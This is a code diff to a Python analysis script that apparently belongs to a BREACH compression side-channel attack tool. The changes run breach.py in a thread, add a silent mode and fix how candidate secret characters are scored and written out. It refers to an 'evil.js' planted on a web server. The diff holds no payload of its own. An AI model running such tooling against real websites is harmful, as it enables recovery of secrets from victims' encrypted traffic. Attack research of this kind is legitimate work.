@@ -6,6 +6,8 @@ import argparse
 import breach
 import signal
 from sys import exit
+import breach
+import threading
 
 def signal_handler(signal, frame):
     '''
@@ -13,6 +15,8 @@ def signal_handler(signal, frame):
     '''
     print('Exiting the program per your command')
     system('rm -f out* result* request* *.pyc')
+    if path.isfile('breach.log'):
+        system("mv breach.log " + args_dict['history_folder'])
     exit(0)
 signal.signal(signal.SIGINT, signal_handler)
 
@@ -101,7 +105,8 @@ def parse_input(args_dict):
     point_system = point_system_parallel if method == 'p' else point_system_serial
     filename = '_'.join(alpha_types) + '_' + prefix
     checkpoint = args_dict['iterations']
-    while 1:
+    loop_parameter = {True: breach_thread.isAlive(), False: True}
+    while loop_parameter[args_dict['execute_breach']]:
         iterations, output_sum = init_temp_objects(alphabet)
         samples = {}
         points = {}
@@ -248,7 +253,6 @@ def parse_input(args_dict):
                                 else:
                                     diff = position[1][0] - points_chart[0][0]
                         result_file.write("%d\t\t%d\t\t%f\t\t%d\t%d\n" % (sample[0], correct_pos, divergence, correct_position_chart, diff))
-            points = sort_dictionary_values(points, True)
             result_file.write("\n")
         else:
             for sample in enumerate(samples):
@@ -260,9 +264,10 @@ def parse_input(args_dict):
                             points[j[1][1]] = points[j[1][1]] + point_system[j[0]]
             result_file.write("\n")
             result_file.write("Iteration %d\n\n" % iterations[alphabet[0]])
-            if method == 's':
+            if method == 's' and combined_sorted:
                 result_file.write("Correct Value is '%s' with divergence %f from second best.\n" % (combined_sorted[0][1], combined_sorted[1][0] - combined_sorted[0][0]))
         if method == 's':
+            points = sort_dictionary_values(points, True)
             for symbol in enumerate(combined_sorted):
                 if symbol[0] % 6 == 0:
                     result_file.write('\n')
@@ -271,7 +276,7 @@ def parse_input(args_dict):
             for symbol in enumerate(points):
                 if symbol[0] % 10 == 0:
                     result_file.write('\n')
-                result_file.write("%s %d\t" % (symbol[1], symbol[0]))
+                result_file.write("%s %d\t" % (symbol[1][1], symbol[1][0]))
         elif method == 'p':
             for symbol in enumerate(combined_sorted):
                 if symbol[0] == 0: # TODO: Better calculation of correct alphabet
@@ -328,14 +333,15 @@ def parse_args():
     parser.add_argument('-t', '--refresh_time', metavar = 'refresh_time', type = int, help = 'Input the refresh time in seconds')
     parser.add_argument('--wdir', metavar = 'web_application_directory', help = 'The directory where you have added evil.js')
     parser.add_argument('--execute_breach', action = 'store_true', help = 'Initiate breach attack via breach.py')
+    parser.add_argument('--silent', action = 'store_true', help = 'Enable silent execution')
     args = parser.parse_args()
 
     args_dict = {}
     args_dict['alpha_types'] = args.alpha_types
-    args_dict['alphabet']= get_alphabet({'alpha_types': args.alpha_types, 'prefix': args.prefix, 'method': args.method})
-    args_dict['pivot_length'] = args.len_pivot
     args_dict['prefix'] = args.prefix
     args_dict['method'] = args.method if args.method else 's'
+    args_dict['alphabet']= get_alphabet({'alpha_types': args_dict['alpha_types'], 'prefix': args_dict['prefix'], 'method': args_dict['method']})
+    args_dict['pivot_length'] = args.len_pivot
     args_dict['minimum_request_length'] = args.request_len if args.request_len else None
     args_dict['correct_val'] = args.correct if args.correct else None
     args_dict['sampling_ratio'] = args.sample if args.sample else 200000000
@@ -344,6 +350,7 @@ def parse_args():
     args_dict['latest_file'] = args.latest_file if args.latest_file >= 0 else -1
     args_dict['wdir'] = args.wdir if args.wdir else '/var/www/breach'
     args_dict['execute_breach'] = True if args.execute_breach else False
+    args_dict['silent'] = True if args.silent else False
     if path.isfile('out_' + '_'.join(args_dict['alpha_types']) + '_' + args_dict['prefix'] + '_' + str(args_dict['latest_file'] + 1)):
         raw = raw_input("Are you sure you want to overwrite file " + 'out_' + '_'.join(args_dict['alpha_types']) + '_' + args_dict['prefix'] + '_' + str(args_dict['latest_file'] + 1) + "'? ")
         assert raw == 'y' or raw == 'yes', "Aborted by user input"
@@ -356,7 +363,8 @@ if __name__ == "__main__":
     args_dict['history_folder'] = 'history_' + '_'.join(args_dict['alpha_types']) + '_' + args_dict['method'] + '_' + str(getpid()) + '/'
     system('mkdir ' + args_dict['history_folder'])
     if args_dict['execute_breach']:
-        # NOTE: Run breach.py on background. Don't forget to kill it after you close parse.py!
-        system('sudo python breach.py --silent -a ' + ' '.join(args_dict['alpha_types']) + ' -p '+ args_dict['prefix'] + ' -m ' + args_dict['method'] + ' --wdir ' + args_dict['wdir'] + ' &')
-
+        breach_obj = breach.Breach(args_dict)
+        breach_thread = threading.Thread(target = breach_obj.execute_breach, args=())
+        breach_thread.daemon = True
+        breach_thread.start()
     parse_input(args_dict)
